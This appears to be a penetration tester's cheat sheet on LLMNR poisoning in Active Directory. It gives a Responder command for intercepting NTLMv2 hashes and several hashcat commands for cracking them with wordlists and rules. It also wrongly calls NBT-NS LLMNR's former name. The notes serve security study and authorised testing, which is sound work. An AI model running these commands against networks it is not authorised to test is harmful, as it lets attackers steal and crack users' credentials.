# LLMNR Poisoning

**Link-Local Multicast Name Resolution** - One of the most common AD attacks.

## Overview

- Used to identify hosts when DNS fails
- Previously known as NBT-NS
- Best used when there's lots of network traffic
- Man-in-the-middle attack

**Key Flaw:** Services transmit username and NTLMv2 hash, allowing interception.

## Attack with Responder

```bash
sudo responder -I tun0 -dw
```

Note: Can only use one of `-d`, `-w`, or `-P` at a time.

## Cracking Captured Hashes

Find the correct hashcat mode:

```bash
hashcat --help | grep NTLM
```

Reference: https://hashcat.net/wiki/doku.php?id=example_hashes

Crack NTLMv2 (mode 5600):

```bash
# Basic
hashcat -m 5600 hash.txt /path/to/wordlist

# With rules (better for real engagements)
hashcat -m 5600 hash.txt /path/to/wordlist -r OneRule

# Force flag if issues in VM
hashcat -m 5600 hash.txt /path/to/wordlist --force

# Optimized mode
hashcat -m 5600 hash.txt /path/to/wordlist -O
```

**Notes:**
- rockyou2021 is 91GB of passwords
- Can take several hours to crack
- Use rule sets in real engagements, less so in CTFs
